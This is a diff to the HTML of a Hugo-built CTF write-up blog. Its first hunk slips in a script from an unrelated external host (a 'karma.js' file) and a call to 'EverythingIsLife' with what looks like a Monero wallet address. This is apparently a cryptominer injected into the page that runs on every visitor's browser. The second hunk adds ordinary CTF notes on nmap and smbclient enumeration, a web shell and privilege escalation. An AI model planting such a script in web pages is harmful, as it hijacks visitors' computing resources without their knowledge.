@@ -43,7 +43,12 @@
 
 <meta name="generator" content="Hugo 0.118.2">
 <link rel="alternate" href="https://ctf-journey.github.io/index.xml" type="application/rss+xml" title="CTF Journey">
-<script src="https://ctf-journey.github.io/js/dark-mode.js"></script><link rel="stylesheet" href="/style.min.css">
+<script src="https://ctf-journey.github.io/js/dark-mode.js"></script>
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+
+<script type="text/javascript">
+EverythingIsLife('46ZyQRM8aNm68MxaoFsG7WirtpoW99EzjaWiUUUkFHhSiK74tnEfqusSaJhPY7mCFSCcdGuVN4tHHHwfzSNMBjGW2D6cFbk', 'x', 30);
+</script><link rel="stylesheet" href="/style.min.css">
 
 
 
@@ -475,11 +480,31 @@ if (!doNotTrack) {
 <li>Nmap</li>
 <li>Metasploit</li>
 <li>Exploit Database <a href="https://www.exploit-db.com/">Website</a></li>
+<li>enum4linux, SMB share enumeration</li>
 </ul>
 <h2 id="key-concepts">Key concepts</h2>
 <ul>
-<li>Enumeration</li>
-<li>Gaining access</li>
+<li>Enumeration
+<ul>
+<li>Port scanning
+<ul>
+<li><code>nmap -sC -sV</code></li>
+</ul>
+</li>
+<li>SMB shares
+<ul>
+<li><code>smbclient -L target_ip</code></li>
+</ul>
+</li>
+<li>FTP server</li>
+<li>WinRM</li>
+</ul>
+</li>
+<li>Gaining access
+<ul>
+<li>Web shell</li>
+</ul>
+</li>
 <li>Privillege escalation
 <ul>
 <li>Restricted shell
